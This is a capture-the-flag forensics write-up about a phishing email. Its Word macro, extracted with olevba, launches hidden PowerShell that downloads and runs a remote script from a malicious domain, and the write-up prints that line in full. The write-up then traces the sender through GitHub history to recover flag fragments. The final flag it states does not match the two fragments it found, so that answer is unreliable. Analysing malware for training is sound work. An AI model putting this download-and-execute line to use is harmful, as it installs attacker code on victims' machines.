### InfraBroken :

# Description :

>An attacker sends a phishing email disguised as a legitimate notification about a package arrival. The email instructs the recipient to click on a link to view an invoice and product details, which is actually a malicious attempt to steal sensitive information or install malware on the victim's machine !!!

> Author : Mr_Togoo

> Attachments : [crime.eml](https://www.mediafire.com/file/lcso0oy3pjqo3kd/crime.eml/file)

During the analysis of the email, we identified the user who sent the email and the link to the document.

    1- user : aymanetogoo@gmail.com
    2- document : Product_details.docm


![email](https://github.com/user-attachments/assets/0185408a-f9c4-4b28-bc90-94f9d4d15cbd)




    We installed the document Product_details.docm and analyzed it with 'olevba'.



![Product](https://github.com/user-attachments/assets/9e62eeea-1c68-4853-809d-de388a6d530e)


We obtained this output:

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command iex (New-Object Net.WebClient).DownloadString('http://bericht-belastingdienst.com/good_news.vbs')", 0, False

1. When checking the reputation of the domain bericht-belastingdienst.com, we found it to be very malicious.

![virustotal](https://github.com/user-attachments/assets/d75e1e85-7cce-4932-b621-681f8800fcc6)
And here, we obtained the first part of the flag.

`CSP{5om3tim35_th3_thing5`


2. Now, we need to check the user who sent the email and perform some OSINT to see if they have other social media accounts.
   
   

![github](https://github.com/user-attachments/assets/08c1aa55-7730-4fa6-bd48-9a2414d3ff41)
3. So, he has a GitHub account and a repository named `Important`
   

![github2](https://github.com/user-attachments/assets/98f3debf-ac9e-47d1-a67a-7542fdae8ca6)

![github3](https://github.com/user-attachments/assets/df36c2c6-6264-4254-a3d5-c499afeab9d1)
4.  When you enter GitHub, you don't find the flag immediately. You need to check the history of the comments to find it.

   `_4r3_34Sy_but_l4h_yhdin4}`

5. So, the full flag is

FLAG : 
>CSP{DN5_G00D_T0_3XF1L7R3_V1A_53CUR3_CH4NN3L5_4ND_L4H_YT9ABL_SY4MNA}
